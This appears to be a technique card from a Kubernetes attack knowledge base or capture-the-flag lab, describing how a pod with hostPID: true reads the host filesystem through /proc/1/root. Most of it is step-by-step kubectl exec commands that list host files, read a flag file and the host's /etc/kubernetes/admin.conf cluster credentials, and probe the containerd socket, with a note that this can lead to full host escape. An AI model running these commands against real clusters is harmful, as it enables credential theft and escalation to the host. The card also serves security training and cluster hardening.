title: K8s hostPID ProcFS Host Filesystem Access — /proc/1/root Host Read (K8S-23)
description: When a pod runs with hostPID: true, it shares the host's PID namespace and can access the host filesystem through /proc/1/root (the root filesystem of PID 1 on the host). This technique works even when the pod is otherwise locked down (non-root user, no capabilities, restricted seccomp profile) — hostPID alone is sufficient for host filesystem read access. Attack: (1) Identify pods with hostPID: true: kubectl get pod monitor-pod -n monitor-ns -o yaml | grep -A10 securityContext — look for hostPID: true. (2) Even with runAsUser: 1000 and all capabilities dropped, access the host filesystem: kubectl exec -n monitor-ns monitor-pod -- ls /proc/1/root/. (3) Read host files directly: kubectl exec -n monitor-ns monitor-pod -- cat /proc/1/root/host-flag/flag.txt. (4) Enumerate host processes: kubectl exec -n monitor-ns monitor-pod -- ps aux. (5) Read host metadata and credentials: kubectl exec -n monitor-ns monitor-pod -- cat /proc/1/root/etc/kubernetes/admin.conf. (6) Access container runtime socket via host: kubectl exec monitor-pod -- ls /proc/1/root/run/containerd/containerd.sock. Key insights: (a) hostPID:true shares the host PID namespace — /proc/1 is the host's init process. (b) /proc/1/root is a symbolic link to the host's root filesystem. (c) This works regardless of the container's runAsUser setting — file access is constrained by the host's file permissions, not container isolation. (d) Even read-only host filesystem access can leak kubeconfig files, ServiceAccount tokens, cloud credentials, and flag files. (e) If combined with a writable mount or container runtime socket, this becomes a full host escape.
techniques: kubectl get pod monitor-pod -n monitor-ns -o yaml | grep -A10 securityContext
kubectl exec -n monitor-ns monitor-pod -- ps aux
indicators: Pod appears locked down (non-root, no caps) but has hostPID
Host flag files at known paths (/host-flag/, /flag.txt)
prerequisites: kubectl exec access to pod with hostPID: true
Pod runs on target node (hostPID exposes host's /proc)
Host filesystem readable through /proc/1/root (file permissions permitting)
